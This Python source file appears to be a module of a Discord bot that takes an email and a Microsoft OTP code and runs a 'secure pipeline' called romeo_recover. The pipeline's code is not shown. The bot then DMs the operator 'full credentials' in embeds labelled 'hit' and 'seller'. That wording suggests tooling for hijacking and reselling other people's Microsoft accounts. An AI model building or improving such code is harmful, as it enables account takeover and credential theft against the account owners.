from discord import ui
import discord
import logging
from datetime import datetime, timezone

from authsecuring.recover import romeo_recover
from authsecuring.embed_builder import build_failure_embed

rom = logging.getLogger(__name__)


class OtpSecureModal(ui.Modal):
    """MS Auth OTP secure — single account, email + OTP code from Microsoft."""

    def __init__(self):
        super().__init__(title="MS Auth OTP Secure", timeout=300)

        self.email_input = ui.InputText(
            label="Email",
            placeholder="user@gmail.com",
            required=True,
            max_length=255,
        )
        self.otp_input = ui.InputText(
            label="OTP Code",
            placeholder="Microsoft email OTP (6 digits)",
            required=True,
            min_length=6,
            max_length=6,
            pattern="[0-9]{6}",
        )
        self.add_item(self.email_input)
        self.add_item(self.otp_input)

    async def callback(self, interaction: discord.Interaction):
        email = self.email_input.value.strip()
        otp_code = self.otp_input.value.strip()

        await interaction.response.defer(ephemeral=True)

        await interaction.followup.send(
            embed=discord.Embed(
                title="🔐 Securing via MS Auth OTP",
                description=f"Email `{email}` · OTP received, running full secure pipeline…",
                color=0x5865F2,
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

        try:
            account = await romeo_recover(
                email=email,
                method="msauth",
                data={
                    "otp_code": otp_code,
                    "request_otp": False,
                },
            )
        except Exception as exc:
            rom.exception("otp_secure crashed for %s", email)
            fail_embed = build_failure_embed(
                email,
                {},
                "Unexpected error during OTP secure.",
                error=str(exc),
            )
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            return

        if isinstance(account, dict) and account.get("failed"):
            fail_embed = account.get("hit_embed") or account.get("seller_embed")
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            try:
                await interaction.user.send(embed=fail_embed)
            except discord.Forbidden:
                await interaction.followup.send(
                    "Could not DM you — enable DMs from server members.",
                    ephemeral=True,
                )
            return

        if account == "invalid":
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Invalid OTP",
                    description="The OTP code is invalid or expired. Request a fresh one and try again.",
                    color=0xFA4343,
                ),
                ephemeral=True,
            )
            return

        if not account:
            fail_embed = build_failure_embed(
                email,
                {},
                "OTP secure failed. Make sure the OTP is valid and 2FA is enabled.",
            )
            await interaction.followup.send(embed=fail_embed, ephemeral=True)
            try:
                await interaction.user.send(embed=fail_embed)
            except discord.Forbidden:
                pass
            return

        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Secured",
                description="Account secured via MS Auth OTP. Check your DMs for full credentials.",
                color=0x57F287,
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

        await interaction.user.send(
            embed=account.get("hit_embed") or account.get("seller_embed"),
        )
